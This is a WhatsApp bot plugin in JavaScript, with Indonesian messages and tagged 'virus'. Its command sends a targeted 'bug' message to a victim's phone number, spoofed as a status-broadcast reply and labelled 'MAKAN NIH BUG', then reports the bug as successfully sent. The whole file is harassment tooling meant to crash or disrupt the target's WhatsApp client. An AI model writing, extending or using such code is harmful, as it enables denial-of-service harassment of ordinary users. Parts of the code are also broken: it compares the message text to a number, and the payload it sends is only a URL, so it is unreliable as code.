let fs = require('fs')

let handler = async(m, { conn, text, usedPrefix }) => {
let [number, bebas] = text.split `|`
    if (!number) return conn.reply(m.chat, 'Silahkan masukan nomor yang akan dikirim', m)
    if (!bebas) return conn.reply(m.chat, 'Silahkan masukan pesannya', m)
    if (text > 500) return conn.reply(m.chat, 'Teks Kepanjangan!', m)    
    let user = global.db.data.users[m.sender]

   
    let vir = ('https://raw.githubusercontent.com/AyGemuy/HinataBot/master/plugins/tools-virtext.js')
    let korban = `${number}`
    var nomor = m.sender
    

    conn.fakeReply(korban + '@s.whatsapp.net', vir, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
    let logs = `[!] Berhasil mengirim Bug wa ke nomor ${korban}`
    conn.reply(m.chat, logs, m)
}
handler.help = ['vkoko3 <nomor>|<text bebas>']
handler.tags = ['virus']
handler.command = /^(vkoko3)$/i
handler.owner = true
handler.rowner = false
handler.limit = false
handler.premium = false
handler.group = false
handler.private = false

handler.admin = false
handler.botAdmin = false
handler.fail = null

module.exports = handler
